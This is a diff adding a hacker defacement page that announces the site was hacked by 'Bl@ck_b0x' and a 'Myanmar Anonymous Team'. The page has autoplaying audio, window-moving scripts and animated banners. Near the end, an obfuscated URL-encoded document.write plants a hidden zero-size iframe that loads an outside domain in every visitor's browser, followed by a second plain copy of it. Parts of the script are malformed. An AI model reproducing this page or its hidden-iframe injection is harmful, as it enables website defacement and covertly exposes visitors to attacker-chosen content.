@@ -1,0 +1,584 @@
+
+<html><head>
+  <style type="text/css">
+HTML,BODY{cursor: url("http://downloads.totallyfreecursors.com/cursor_files/indonesia.ani"), url("http://i55.tinypic.com/2z7ld11.gif"), auto;}
+</style>
+<meta http-equiv="content-type" content="text/html; charset=UTF-16">
+<meta name="verify-v1" content="WqT6kZySLLYe/gRjkWf1sNcr+RrPRuowoZD31PZAV+Q=">
+  <title>Bl@ck_b0x & Mr_D4rK3Y3 & Mr_GreyDevil</title>
+  <link rel="SHORTCUT ICON" href="http://oi65.tinypic.com/2n0nbbc.jpg">
+</head><body text="16777215" bgcolor="#000000"><center>
+<script src="http://rules.quantcount.com/rules-p-44naSaXtNJt26.js" async=""></script><script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/howler/2.0.3/howler.min.js"></script>
+<script type="text/javascript"> var sound = new Howl({src: ['https://dl.dropboxusercontent.com/s/mnw91qaob50ozvl/we are anonymous.mp3'],loop: true,autoplay: true}); sound.play(); </script>
+<script>
+window.scrollBy(0, 1)
+window.resizeTo(0,0)
+window.moveTo(0,0)
+//setInterval("move()",30);
+setTimeout("move()", 1);
+var mxm=50
+var mym=25
+var mx=0
+var my=0
+var sv=50
+var status=1
+var szx=0
+var szy=0
+var c=255
+var n=0
+var sm=30
+var cycle=2
+var done=2
+function move()
+{
+if (status == 1)
+{
+mxm=mxm/1.05
+mym=mym/1.05
+mx=mx+mxm
+my=my-mym
+mxm=mxm+(400-mx)/100
+mym=mym-(300-my)/100
+window.moveTo(mx,my)
+rmxm=Math.round(mxm/10)
+rmym=Math.round(mym/10)
+if (rmxm == 0)
+{
+if (rmym == 0)
+{
+status=2
+}
+}
+}
+if (status == 2)
+{
+sv=sv/1.1
+scrratio=1+1/3
+mx=mx-sv*scrratio/2
+my=my-sv/2
+szx=szx+sv*scrratio
+szy=szy+sv
+window.moveTo(mx,my)
+window.resizeTo(szx,szy)
+if (sv < 0.1)
+{
+status=3
+}
+}
+if (status == 3)
+{
+document.fgColor=0xffffFF
+c=c-16
+if (c<0)
+{status=8}
+}
+if (status == 4)
+{
+c=c+16
+document.bgColor=c*65536
+document.fgColor=(255-c)*65536
+if (c > 239)
+{status=5}
+}
+if (status == 5)
+{
+c=c-16
+document.bgColor=c*65536
+document.fgColor=(255-c)*65536
+if (c < 0)
+{
+status=6
+cycle=cycle-1
+if (cycle > 0)
+{
+if (done == 1)
+{status=7}
+else
+{status=4}
+}
+}
+}
+if (status == 6)
+{
+document.title = "Cljck"
+alert("Cljck")
+cycle=2
+status=4
+done=1
+}
+if (status == 7)
+{
+c=c+4
+document.bgColor=c*65536
+document.fgColor=(255-c)*65536
+if (c > 128)
+{status=8}
+}
+if (status == 8)
+{
+window.moveTo(0,0)
+sx=screen.availWidth
+sy=screen.availHeight
+window.resizeTo(sx,sy)
+status=9
+}
+var timer=setTimeout("move()",0.3)
+}
+</script>
+<script>
+TypingText = function(element, interval, cursor, finishedCallback) {
+  if((typeof document.getElementById == "undefined") || (typeof element.innerHTML == "undefined")) {
+    this.running = true; // Never run.
+    return;
+  }
+  this.element = element;
+  this.finishedCallback = (finishedCallback ? finishedCallback : function() { return; });
+  this.interval = (typeof interval == "undefined" ? 100 : interval);
+  this.origText = this.element.innerHTML;
+  this.unparsedOrigText = this.origText;
+  this.cursor = (cursor ? cursor : "");
+  this.currentText = "";
+  this.currentChar = 0;
+  this.element.typingText = this;
+  if(this.element.id == "") this.element.id = "typingtext" + TypingText.currentIndex++;
+  TypingText.all.push(this);
+  this.running = false;
+  this.inTag = false;
+  this.tagBuffer = "";
+  this.inHTMLEntity = false;
+  this.HTMLEntityBuffer = "";
+}
+TypingText.all = new Array();
+TypingText.currentIndex = 0;
+TypingText.runAll = function() {
+  for(var i = 0; i < TypingText.all.length; i++) TypingText.all[i].run();
+}
+TypingText.prototype.run = function() {
+ if(this.running) return;
+ if(typeof this.origText == "undefined") {
+   setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval); // We haven't finished loading yet.  Have patience. http://www.lozere.maisons-paysannes.org/media/erne.swf
+   return;
+ }
+ if(this.currentText == "") this.element.innerHTML = "";
+//  this.origText = this.origText.replace(/<([^<])*>/, "");     // Strip HTML from text.
+  if(this.currentChar < this.origText.length) {
+   if(this.origText.charAt(this.currentChar) == "<" && !this.inTag) {
+     this.tagBuffer = "<";
+     this.inTag = true;
+     this.currentChar++;
+     this.run();
+     return;
+   } else if(this.origText.charAt(this.currentChar) == ">" && this.inTag) {
+     this.tagBuffer += ">";
+      this.inTag = false;
+      this.currentText += this.tagBuffer;
+      this.currentChar++;
+      this.run();
+      return;
+    } else if(this.inTag) {
+      this.tagBuffer += this.origText.charAt(this.currentChar);
+      this.currentChar++;
+      this.run();
+      return;
+    } else if(this.origText.charAt(this.currentChar) == "&" && !this.inHTMLEntity) {
+     this.HTMLEntityBuffer = "&";
+      this.inHTMLEntity = true;
+      this.currentChar++;
+      this.run();
+      return;
+    } else if(this.origText.charAt(this.currentChar) == ";" && this.inHTMLEntity) {
+     this.HTMLEntityBuffer += ";";
+      this.inHTMLEntity = false;
+      this.currentText += this.HTMLEntityBuffer;
+      this.currentChar++;
+      this.run();
+      return;
+    } else if(this.inHTMLEntity) {
+      this.HTMLEntityBuffer += this.origText.charAt(this.currentChar);
+      this.currentChar++;
+      this.run();
+      return;
+    } else {
+      this.currentText += this.origText.charAt(this.currentChar);
+    }
+    this.element.innerHTML = this.currentText;
+    this.element.innerHTML += (this.currentChar < this.origText.length - 1 ? (typeof this.cursor == "function" ? this.cursor(this.currentText) : this.cursor) : "");
+   this.currentChar++;
+   setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);
+ } else {
+this.currentText = "";
+this.currentChar = 0;
+       this.running = false;
+       this.finishedCallback();
+ }
+}
+</script>
+<style>
+body {
+ padding:0;
+ margin:0;
+ background-repeat: no-repeat;
+ background-position:tile;
+background-color: black;
+color: #000000;
+font: normal 100% Courier;
+margin-top: 0px;
+margin-left: 0px;
+padding: 0;
+margin-right: 0px;
+}
+</style>
+<img src="http://2.bp.blogspot.com/-sr-vjmy9uUc/UacqykvBfaI/AAAAAAAAAEE/m242AGAe9FA/s1600/Logo-6-hacker.jpg">
+<script type="text/javascript">if(typeof(urchinTracker)=='function'){_uacct="UA-230305-2";_udn="none";_uff=false;urchinTracker();}</script> <script type="text/javascript" src="http://edge.quantserve.com/quant.js"></script> <script type="text/javascript">_qacct="p-44naSaXtNJt26";quantserve();</script> <div style="text-align: right;position: fixed;z-index:9999999;bottom: 0;width: auto;right: 1%;cursor: pointer;line-height: 0;display:block !important;"><a title="Hosted on free web hosting 000webhost.com. Host your own website for FREE." target="_blank" href="https://www.000webhost.com/?utm_source=000webhostapp&amp;utm_campaign=000_logo&amp;utm_medium=website&amp;utm_content=footer_img"></a></div><center>
+  
+</script></font></h1><br>
+
+<h1></script><span id="a0" class="a0" style="color: rgb(255, 0, 0);"> </span><span id="a1" class="a1" style="color: rgb(255, 0, 0);">{ M</span><span id="a2" class="a2" style="color: rgb(255, 0, 0);">y</span><span id="a3" class="a3" style="color: rgb(255, 0, 0);">a</span><span id="a4" class="a4" style="color: rgb(255, 0, 0);">n</span><span id="a5" class="a5" style="color: rgb(255, 0, 0);">m</span><span id="a6" class="a6" style="color: rgb(255, 0, 0);">r</span><span id="a7" class="a7" style="color: rgb(255, 0, 0);">_A</span><span id="a8" class="a8" style="color: rgb(255, 0, 0);">n</span><span id="a9" class="a9" style="color: rgb(255,0, 0);">o</span><span id="a10" class="a10" style="color: rgb(255, 0, 0);">n</span><span id="a11" class="a11" style="color: rgb(255, 0, 0);">y</span><span id="a12" class="a12" style="color: rgb(255, 0, 0);">m</span><span id="a13" class="a13" style="color: rgb(255, 0, 0);">o</span><span id="a14" class="a14" style="color: rgb(255, 0, 0);">u</span><span id="a15" class="a15" style="color: rgb(255, 0, 0);">s</span><span id="a16" class="a16" style="color: rgb(255, 0, 0);">_T</span><span id="a17" class="a17" style="color: rgb(255, 0, 0);">e</span><span id="a18" class="a18" style="color: rgb(255, 0, 0);">a</span><span id="a19" class="a19" style="color: rgb(255, 0, 0);">m}</span><span id="a20" class="a20" style="color: rgb(255, 0, 0);"></span><span id="a21" class="a21" style="color: rgb(255, 0, 0);"></span><span id="a22" class="a22" style="color: rgb(255, 0, 0);"> </span><span id="a23" class="a23" style="color: rgb(255, 0, 0);"></span></font></center></h1><br>
+ 
+<style type="text/css">.matrix {
+PADDING-RIGHT: 0px; PADDING-LEFT: 0px; FONT-SIZE: 10pt; PADDING-BOTTOM: 0px; MARGIN: 0px; WIDTH: 10px; PADDING-TOP: 0px; FONT-FAMILY: Lucida Console, Courier, Monotype; TEXT-ALIGN: center
+}
+</style>
+<a href="http://devilscafe.co.cc" title="weLcome To Hacking world"></a><br><a href="http://devilscafe.co.cc" title="weLcoMe"></a>
+<p></p>
+<script language="JavaScript">
+msg = new Array(); //strings written in screen
+msg[0] = "<h2><font face='Courier'><center> ---==[+|<FONT color=#00FF00> |+]==---</center></h2>";
+msg[1] = "<b> </font> <font face='Courier' color='#00FF00'></font>";
+msg[2] = "<font face='Courier' color='#00FF00'>Hello!!! Admin</font>";
+msg[3] = "<font face='Courier' color='#00FF00'> <{+=================+}>";
+msg[4] = "<font face='Courier' color='#00FF00'><~~~~~~~~~~~~~~~</font>";
+text1 = ""; //the same as text2, only the last character is highlighted
+text2 = ""; //current string, which will be written
+count = 0; //char index in string text
+count2 = 0; //number of strings
+text = msg[0].split(""); //text - string written
+function writetext() { //show strings above on screen
+text1 = text2 + "<font color='#00FF00'>" + text[count] + "</font>";
+text2 += text[count];
+document.all["nothing"].innerHTML = text1; //where to write
+ 
+if (count < text.length-1){
+count++;
+setTimeout('writetext()', 25);
+}
+else { //if this string is written, get the new string
+count = 0;
+if (count2 != 4) { //write 4 strings
+count2++;
+text2 += "<p>"; //a new line
+text = eval('msg['+count2+'].split("")'); //get the new string to text
+setTimeout('writetext()', 25);
+}
+
+</script>
+<h1><font face="Courier"><center> <font color="#00EEFF">---=={ M-A-T }==---</font></center></font></h2><font face="Courier"><font color="#FF0000">
+<center><b><marquee scrollamount="50" direction="life" size="20"><font style="text-shadow: 0 0 10px #00ffff;" size="2" color="#00EEFF">--------------------------------------------------------------------------------</font></marquee></b></center>
+<blink><b><font size="18" face="Segoe Print" color="#FF00CE"> ---={    Sorry !! For Hack  }==---</font></b> </blink>
+ 
+<center><font color="#00ff00"><b><marquee scrollamount="40" direction="right" size="20"><font style="text-shadow: 0 0 10px #FF0000;" size="2" color="#00EEFF">--------------------------------------------------------------------------------</font></marquee></b></font></center>
+<font face="Segoe Print" color="#FFFF00"><marquee>    </marquee>
+  <p id="example2"> <font color="#FF0000" style="font-size: 50px;">  { I've no choice but haching' } </font></p><font color="#00FF00">
+    <script type="text/javascript">
+//Define first typing example:
+new TypingText(document.getElementById("example1"), 250, function(i){
+var ar = new Array("===>>","===>>","===>>","===>>"); return " " + ar[i.length %
+ar.length]; });
+//Define second typing example (use "slashing" cursor at the end):
+new TypingText(document.getElementById("example2"), 250, function(i){
+var ar = new Array("\\","|","/","-"); return " " + ar[i.length %
+ar.length]; });
+//Define second typing example (use "slashing" cursor at the end):
+new TypingText(document.getElementById("example3"), 250, function(i){
+var ar = new Array("\\","|","/","-"); return " " + ar[i.length %
+ar.length]; });
+//Type out examples:
+TypingText.runAll();
+ 
+</script>
+<p align="center">
+</p>
+<script type="text/javascript">
+      // ------------------------------------------------------------------------------------
+      //  Matrix Code By Bl Nine Coder
+      // ------------------------------------------------------------------------------------
+      var theinHTML;
+      var thelessstr;
+      var ascSt=22;
+      var ascEnd=126;
+      var numoflines = 28;
+      var lines = new Array();
+      var intervalID = new Array();
+      var subIntervalID = new Array();
+      var subIntervalID2 = new Array();
+      var scH = screen.height-220;
+      var scW = screen.width-50;
+      window.onload = createlines;
+      // -------------------------------------------------------------------------------------
+      // Convert decimal to hex (for the colour)
+      var hD="0123456789ABCDEF";
+      function d2h(d)
+      {
+         var h = hD.substr(d&15,1);
+         while(d > 15)
+         {
+            d >>= 4;
+            h = hD.substr(d&15,1)+h;
+         }
+         return h;
+      }
+      // -------------------------------------------------------------------------------------
+      // The line object      
+      function line(length, maxlength, chars, speed, x)
+      {
+         this.length = length;
+         this.maxlength = maxlength;
+         this.chars = chars;
+         this.speed = speed;
+         this.x = x;
+      }    
+      // -------------------------------------------------------------------------------------
+      // Creates the lines
+      function createlines()
+      {            
+      // create the lines as objects as defined above with length, characters, speed, x-value
+         for(var eachline = 0; eachline < numoflines; eachline++)
+        {
+           lines[eachline] = new line(0, Math.round(Math.random()*15+5), String.fromCharCode(Math.round(Math.random()*(ascEnd-ascSt)+ascSt)), Math.round(Math.random()*400+100), eachline*70);
+        }  
+        // write the lines  
+        for(var writelines = 0; writelines < numoflines; writelines++)
+        {
+           var newline = document.createElement("div");
+           newline.id = "char" + writelines;
+           newline.style.position = "absolute";
+           newline.style.top = "5px";
+           newline.style.left = lines[writelines].x + "px";        
+           var firstchar = document.createElement("div");
+           var newcolor = d2h(Math.round(1/(lines[writelines].maxlength+1)*255));
+           if(newcolor.length == 1)
+              newcolor = "0" + newcolor;
+           firstchar.style.color = "#FF00FB"+newcolor+"#FF00FB"
+           firstchar.innerHTML = lines[writelines].chars
+           newline.appendChild(firstchar);          
+           document.body.appendChild(newline);
+        }
+        start();
+     }
+     // -------------------------------------------------------------------------------------
+     // Starts it moving & changing
+     function start()
+     {
+        for(var pickastring = 0; pickastring < numoflines; pickastring++)
+        {
+           intervalID[pickastring] = setInterval("addchars("+pickastring+")", lines[pickastring].speed);
+        }
+     }
+     // -------------------------------------------------------------------------------------
+     // Add random characters to the string (and a line break)
+     // and make sure the last one is light
+     // once it gets to maxlength start moving down
+     function addchars(theline)
+     {
+        if(lines[theline].length >= lines[theline].maxlength)
+         {
+            clearInterval(intervalID[theline]);
+            subIntervalID[theline] = setInterval("movethestring("+theline+")", lines[theline].speed);
+         }
+         else
+         {
+            // Get a char (not " or ' or \ or it'll get confused)
+            myRandomChar = String.fromCharCode(Math.round(Math.random()*(ascEnd-ascSt)+ascSt));
+            while(myRandomChar == "'" || myRandomChar == '"' || myRandomChar == "\\")
+               myRandomChar = String.fromCharCode(Math.round(Math.random()*(ascEnd-ascSt)+ascSt));
+            // Make a new div for it (so we can change it's colour)
+            var newchar = document.createElement("div");
+            newchar.innerHTML = myRandomChar;
+            document.getElementById("char"+theline).appendChild(newchar);
+            // Colour it
+            var i;
+            for(i = 0; i <= lines[theline].length; i++)
+           {
+              var newcolor = d2h(Math.round((i+1)/(lines[theline].maxlength+1)*255));
+              newcolor = "" + newcolor;
+              if(newcolor.length == 1)
+                 newcolor = "0" + newcolor;
+              document.getElementById("char"+theline).childNodes[i].style.color = "#00" + newcolor + "00";
+              document.getElementById("char"+theline).childNodes[i].style.fontWeight = "normal";
+           }
+           document.getElementById("char"+theline).childNodes[i].style.color = "#00FFEE";
+           document.getElementById("char"+theline).childNodes[i].style.fontWeight = "bold";
+           // Increase length by one
+           lines[theline].length++;
+        }
+     }
+     // -------------------------------------------------------------------------------------
+     // Moves the string (creates and destroys chars)
+     function movethestring(theline)
+     {
+        var topstringnum = document.getElementById("char"+theline).offsetTop;
+        if((topstringnum + (lines[theline].maxlength * 15)) >= scH)
+         {
+            clearInterval(subIntervalID[theline]);
+            subIntervalID2[theline] = setInterval("clearletters("+theline+")", lines[theline].speed);
+         }
+         else
+         {
+            // create
+            myRandomChar = String.fromCharCode(Math.round(Math.random()*(ascEnd-ascSt)+ascSt));
+            while(myRandomChar=="'" || myRandomChar=='"' || myRandomChar=="\\")
+               myRandomChar = String.fromCharCode(Math.round(Math.random()*(ascEnd-ascSt)+ascSt));
+            var newchar = document.createElement("div");
+            newchar.innerHTML = myRandomChar;
+            document.getElementById("char"+theline).appendChild(newchar);
+            // delete
+            document.getElementById("char"+theline).removeChild(document.getElementById("char"+theline).childNodes[0]);
+            // re-colour
+            var i;
+            for(i = 0; i < lines[theline].length; i++)
+           {
+              var newcolor = d2h(Math.round((i+1)/(lines[theline].maxlength+1)*255));
+              newcolor = "" + newcolor;
+              if(newcolor.length == 1)
+                 newcolor = "0" + newcolor;
+              document.getElementById("char"+theline).childNodes[i].style.color = "#00" + newcolor + "00";
+              document.getElementById("char"+theline).childNodes[i].style.fontWeight = "normal";
+           }
+           document.getElementById("char"+theline).childNodes[i].style.color = "#FF0000";
+           document.getElementById("char"+theline).childNodes[i].style.fontWeight = "bold";
+           // move
+           document.getElementById("char"+theline).style.top = (topstringnum+15) + "px";
+        }
+     }
+     // -------------------------------------------------------------------------------------
+     // pretty much the opposite of addchars()
+     function clearletters(theline)
+     {
+        if(lines[theline].length <= -1)
+        {
+           clearInterval(subIntervalID2[theline]);
+           document.getElementById("char"+theline).style.top = 0;
+           intervalID[theline] = setInterval("addchars("+theline+")", lines[theline].speed);
+        }
+        else
+        {
+           // Remove the first character
+           document.getElementById("char"+theline).removeChild(document.getElementById("char"+theline).childNodes[document.getElementById("char"+theline).childNodes.length-1]);
+           // Move it down by 15px
+           var topstringnum = document.getElementById("char"+theline).offsetTop;
+           document.getElementById("char"+theline).style.top = topstringnum+15 + "px";
+           // Decrease length by one
+           lines[theline].length--;
+        }
+     }
+  </script>
+  <script type="text/javascript">
+<!--//
+function tb9_makeArray(n){
+this.length = n;
+return this.length;
+}
+tb9_messages = new tb9_makeArray(4);
+tb9_messages[0] = " <===== Bl@ck_b0x =====> ";
+tb9_messages[1] = "-=Sorry For Hack!!!=-";
+tb9_messages[5] = " <===== Hacked By Bl@ck_b0x =====> ";
+tb9_rptType = 'infinite';
+tb9_rptNbr = 5;
+tb9_speed = 75;
+tb9_delay = 2000;
+var tb9_counter=1;
+var tb9_currMsg=0;
+var tb9_timerID = null
+var tb9_bannerRunning = false
+var tb9_state = ""
+tb9_clearState()
+function tb9_stopBanner() {
+if (tb9_bannerRunning)
+clearTimeout(tb9_timerID)
+tb9_timerRunning = false
+}
+function tb9_startBanner() {
+tb9_stopBanner()
+tb9_showBanner()
+}
+function tb9_clearState() {
+tb9_state = ""
+for (var i = 0; i < tb9_messages[tb9_currMsg].length; ++i) {
+tb9_state += "0"
+}
+}
+function tb9_showBanner() {
+if (tb9_getString()) {
+tb9_currMsg++
+if (tb9_messages.length <= tb9_currMsg) {
+if ((tb9_rptType == 'finite') && (tb9_counter==tb9_rptNbr)){
+tb9_stopBanner();
+return;
+}
+tb9_counter++;
+tb9_currMsg=0;
+}
+tb9_clearState()
+tb9_timerID = setTimeout("tb9_showBanner()", tb9_delay)
+}
+else {
+var tb9_str = ""
+for (var j = 0; j < tb9_state.length; ++j) {
+tb9_str += (tb9_state.charAt(j) == "1") ? tb9_messages[tb9_currMsg].charAt(j) : "___"
+}
+document.title = tb9_str
+tb9_timerID = setTimeout("tb9_showBanner()", tb9_speed)
+}
+}
+function tb9_getString() {
+var full = true
+for (var j = 0; j < tb9_state.length; ++j) {
+if (tb9_state.charAt(j) == 0)
+full = false
+}
+if (full) return true
+while (1) {
+var num = tb9_getRandom(tb9_messages[tb9_currMsg].length)
+if (tb9_state.charAt(num) == "0")
+break
+}
+tb9_state = tb9_state.substring(0, num) + "1" + tb9_state.substring(num + 1, tb9_state.length)
+return false
+}
+function tb9_getRandom(max) {
+var now = new Date()
+var num = now.getTime() * now.getSeconds() * Math.random()
+return num % max
+}
+tb9_startBanner()
+</script>
+<script>
+<!--
+document.write(unescape("%3Cscript%3E%0A%3C%21--%0Adocument.write%28unescape%28%22%3Ciframe%20frameborder%3D%220%22%20height%3D%220%22%20src%3D%22http%3A//www.devilscafe.in%22%20%0A%0Awidth%3D%220%22%3E%3C/iframe%3E%0A%3Ca%20href%3D%22http%3A//www.devilscafe.in%22%20target%3D%22_blank%22%3E%3Cimg%20%0A%0Asrc%3D%22%22%20/%3E%22%29%29%3B%0A//--%3E%0A%3C/script%3E"));
+//-->
+</script><script>
+<!--
+document.write(unescape("<iframe frameborder="0" height="0" src="http://www.devilscafe.in" 
+
+width="0"></iframe>
+<a href="http://www.devilscafe.in" target="_blank"><img 
+
+src="" />"));
+//-->
+</script>
+<footer>
+<table style="border:1px;border-color:#FF00E4;border-style:double;padding-left:2px;padding-right:2px;bottom:2px;height:25px;width:100%;">
+<tbody><tr>
+<td style="border: 1px;width:10%; background: transparent;box-shadow: 0px 0px 8px #FF0000;
+bottom: 2px; border-color:#FF0000; border-style: dotted" ;="">
+<center>
+<font style="color:#00FFEE;direction:center;font-family:electrolize;font-size:20px;text-shadow:0px 0px 5px Sms;"> M_A_T</font></center>
+</td>
+<td><marquee class="z" style="color:skyred; font-size:20px;font-family:electrolize;text-shadow: 0px 0px 5px aqua; direction:left;" scrollamount="5px">-=|-We are ======&gt;  Fearless ==&gt;  Bl@ck_b0x==&gt; Mr_D4rK3Y3 ==&gt; Mr_GreyDevil ==&gt;  Mr_XXXXX <br>
+</marquee>
+</td></tr>
+</tbody></table>
+</footer>
+
+</body>
+</html>
